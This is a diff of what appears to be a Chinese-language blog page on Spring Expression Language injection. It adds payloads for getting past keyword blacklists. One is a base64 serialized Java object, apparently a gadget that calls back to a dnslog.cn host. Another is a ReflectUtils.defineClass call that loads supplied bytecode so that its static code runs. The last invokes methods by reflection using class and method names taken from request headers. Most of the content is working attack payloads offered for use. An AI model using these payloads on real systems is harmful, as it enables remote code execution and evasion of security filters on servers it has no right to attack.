@@ -193,6 +193,15 @@ SPEL也支持</p>
 也可以通过反序列化。绕过关键字过滤。</p>
 <pre><code>#{T(org.springframework.util.SerializationUtils).deserialize(T(com.sun.org.apache.xml.internal.security.utils.Base64).decode('rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAEHozM3Bzei5kbnNsb2cuY250AABxAH4ABXQABGh0dHBweHQAF2h0dHA6Ly96MzNwc3ouZG5zbG9nLmNueA=='))}
 </code></pre>
+<p>通spring内置的一个方法。 输入类名，字节码，classload就可以new一个类。当类中有static方法的时候。new类就会自动触发</p>
+<pre><code>T(org.springframework.cglib.core.ReflectUtils).defineClass('Singleton',T(com.sun.org.apache.xml.internal.security.utils.Base64).decode('yv66vgAAADIAtQ....'),T(org.springframework.util.ClassUtils).getDefaultClassLoader())
+</code></pre>
+<p>利用request传值。绕过黑名单</p>
+<pre><code>[[${#this.getClass().getClassLoader().loadClass(#request.getHeader(111)).getDeclaredMethod(#req
+uest.getHeader(222),#this.getClass().getClassLoader().loadClass(#request.getHeader(333))).invoke(
+#this.getClass().getClassLoader().loadClass(#request.getHeader(111)).getDeclaredMethod(#reques
+t.getHeader(444)).invoke(null),#request.getParameter(1))}]]
+</code></pre>
 <p>其他bypass的。可以看<br>
 <code>https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</code><br>
 先占个坑。</p>
